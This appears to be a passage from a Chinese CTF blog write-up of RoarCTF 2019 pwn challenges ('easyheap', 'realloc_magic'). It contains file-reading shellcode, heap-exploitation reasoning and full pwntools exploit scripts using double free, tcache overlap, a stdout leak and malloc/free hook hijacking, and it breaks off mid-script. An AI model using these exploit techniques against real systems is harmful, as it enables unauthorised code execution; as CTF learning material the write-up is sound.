0x67616c662f2epush raxmov rdi, rspxor esi, esimov eax, 2syscallcmp eax, 0jg nextpush 1mov edi, 1mov rsi, rspmov edx, 4mov eax, edisyscalljmp exitnext:mov edi, eaxmov rsi, rspmov edx, 0x100xor eax, eaxsyscallmov edx, eaxmov edi, 1mov rsi, rspmov eax, edisyscallexit:xor edi, edimov eax, 231syscall'''</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-easyheap"><a href="#0x02-easyheap" class="headerlink" title="0x02 easyheap"></a>0x02 easyheap</h1><h2 id="查看文件-1"><a href="#查看文件-1" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2019-roarctf-bu-fen-pwn-ti-jie/4.png"></div><h2 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>创建：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2019-roarctf-bu-fen-pwn-ti-jie/5.png"></div><p>最大的size是0x90<br>2.另一个创建功能：创建0xa0大小的chunk，也可以free。但是 只能调用3次</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2019-roarctf-bu-fen-pwn-ti-jie/6.png"></div><p>删除：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2019-roarctf-bu-fen-pwn-ti-jie/7.png"></div><p>show：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2019-roarctf-bu-fen-pwn-ti-jie/8.png"></div>不过需要判断，并且后面的部分会导致一系列错误，无法释放不输出信息等等：（这也是导致第一次没有成功做出的原因）<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2019-roarctf-bu-fen-pwn-ti-jie/9.png"></div><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>这里的思路是利用Double free漏洞构建UAF，修改fd到bss段上，泄露libc_offset。再劫持malloc_hook,还是思路简单，步骤困难。</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> timecontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./easyheap"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># p = remote('39.97.182.233', 41564)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./easyheap"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">start</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>info<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"username:"</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"info:"</span><span class="token punctuation">,</span>info<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"size\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"content\n"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create_A0_chunk</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">666</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"free?\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"content\n"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete_A0_chunk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">666</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"free?\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>one_gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span><span class="token number">0x4526a</span><span class="token punctuation">,</span><span class="token number">0xf02a4</span><span class="token punctuation">,</span><span class="token number">0xf1147</span><span class="token punctuation">]</span>target_data <span class="token operator">=</span> <span class="token number">0xdeadbeefdeadbeef</span>fake_chunk <span class="token operator">=</span> <span class="token number">0x602060</span>start<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create_A0_chunk<span class="token punctuation">(</span><span class="token string">"\x33"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span>delete_A0_chunk<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># use UAF make double free attack</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"cccc"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"cccc"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token punctuation">)</span>delete_A0_chunk<span class="token punctuation">(</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># have fake chunk in pointer list, leak libc offset</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"dddd"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"eeee"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"f"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target_data<span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_offset <span class="token operator">=</span> data <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_offset<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># hijacking malloc_hook</span>target_hook_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_offset<span class="token number">-0x23</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>target_hook_addr<span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>target_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># create(0x60,"\x99"*0x30)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>one_gadget <span class="token operator">=</span> one_gadgets<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_offsetp<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">11</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"realloc"</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_offset<span class="token operator">+</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span><span class="token comment" spellcheck="true"># pause()</span><span class="token comment" spellcheck="true"># time.sleep(0.1)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span><span class="token comment" spellcheck="true"># pause()</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># time.sleep(0.1)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span><span class="token comment" spellcheck="true"># pause()</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"cat flag >&amp;0n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x03-realloc-magic"><a href="#0x03-realloc-magic" class="headerlink" title="0x03 realloc_magic"></a>0x03 realloc_magic</h1><h2 id="查看文件-2"><a href="#查看文件-2" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2019-roarctf-bu-fen-pwn-ti-jie/10.png"></div>保护全部开启，我们考虑到这么两个思路：hijacking hook和io_file attack。## IDA分析###  create<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2019-roarctf-bu-fen-pwn-ti-jie/11.png"></div>这里看到就只有realloc创建，之前一直在ubuntu16下做，如果早点知道这道题环境是18，我觉得应该能A出来。太可惜了...来学习一下realloc在ubuntu18的特性：<ul><li>realloc(0)=free(old)</li><li>realloc(newsize&gt;oldsize)=overlapping</li><li>realloc(newsize&lt;oldsize)=edit</li><li>realloc(newsize)=add</li></ul><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2019-roarctf-bu-fen-pwn-ti-jie/12.png"></div>pointer没有置0### magic<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/27/2019-roarctf-bu-fen-pwn-ti-jie/13.png"></div>指针置0，但是区别是chunk不进tcache，也就是最后没有相通这点，导致未能做出来。不得不说，tcache机制和之前确实有点区别，其实是更好利用了。## 思路利用overlapping修改fd，使tcache指向stdout，由于其分配不用管chunk所以直接指向stdout位置就可以了。<u>**这里还有一个新姿势**</u>下面详细说。泄露出libc地址，得到one_gadget。在进行一次overlapping分配到hook位置放入one_gadget即可。## 步骤### 步骤一：利用overlapping修改fd到stdout，泄露libc<p><strong>第一步，创建好我们利用所需要的chunk：</strong></p><pre class="line-numbers language-python"><code class="language-python">create<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">,</span><span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 我们需要利用这个chunk进行向下overlapping</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>                    <span class="token comment" spellcheck="true"># 释放掉</span>create<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">"\x22"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 这个是中间 chunk，我们需要攻击的chunk</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token string">"\x33"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 下面的chunk，防止Tcache链满的情况下释放small chunk进入unsorted bin的时候和top chunk合并</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 再分配</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>              <span class="token comment" spellcheck="true"># 这是为了填满Tcache链</span>    Delete<span class="token punctuation">(</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>                    <span class="token comment" spellcheck="true"># 问题：為什麼不能用delete代替</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>第二步：进行修改fd，同时将Tcache中挡在目标chunk前面的chunk利用掉</strong></p><pre class="line-numbers language-python"><code class="language-python">create<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">,</span><span class="token string">"\x88"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token string">"\x55"</span><span class="token operator">*</span><span class="token number">0x110</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x60\x07\xdd"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 这里修改尺寸的原因是为了利用掉目标 chunk前面的size，释放的时候不会再回到0x110Tcache链的头部</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 這裡是釋放0x200</span>create<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">"\x99"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 因為tcache類似於fastbin的分配策略，所以我們需要將最前面的chunk使用，以達到下次分配的是目標地址</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 這裡也就解釋了為什麼要將前面的size修改，因為不修改那麼這裡又會進入到0x110的tcache</span>create<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 注意这里是将write_base的地址改为一个存放libc上可以计算的数据的地址。当然也可以是用老方法，将后两位改为write_base地址，这样输出直接就是libc上地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>第三步：获得libc相关地址，算出libcbase</strong></p><pre class="line-numbers language-python"><code class="language-python">p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7ffff7dcf780</span> <span class="token operator">-</span> <span class="token number">0x7ffff79e4000</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc base => "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="步骤二：hijacking-hook"><a href="#步骤二：hijacking-hook" class="headerlink" title="步骤二：hijacking hook"></a>步骤二：hijacking hook</h3><p><strong>第一步：释放指针，重新布置堆</strong></p><pre class="line-numbers language-python"><code class="language-python">Magic<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 釋放這個指針，重新再利用。這裡為什麼又不用create(0)?是因為用的話之前在stdout的那個chunk就會進入tcache</span><span class="token comment" spellcheck="true"># 導致一系列錯誤 </span><span class="token comment" spellcheck="true"># 但是這裡為了預防tcache鏈發生混亂，在這裡我們選取三個大小的chunk，分別是沒有用的</span><span class="token comment" spellcheck="true"># 0x90、0xa0、0x70</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"new1"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">"new2"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"new3"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">"new2"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 最後一個delete和create到底有什麼不同</span>    Delete<span class="token punctuation">(</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"new1"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>第二步：老方法，overlapping，再hijaking free_hook</strong></p><pre class="line-numbers language-python"><code class="language-python">create<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x51</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">"\x11"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 更新tcache的fd指針</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 將這個chunk釋放，由於其size已經發生改變所以不會再次進入0xa0的list</span>create<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>gadgets<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./realloc_magic'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./realloc_magic'</span><span class="token punctuation">)</span>gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2c5</span><span class="token punctuation">,</span><span class="token number">0x4f322</span><span class="token punctuation">,</span><span class="token number">0x10a38c</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span 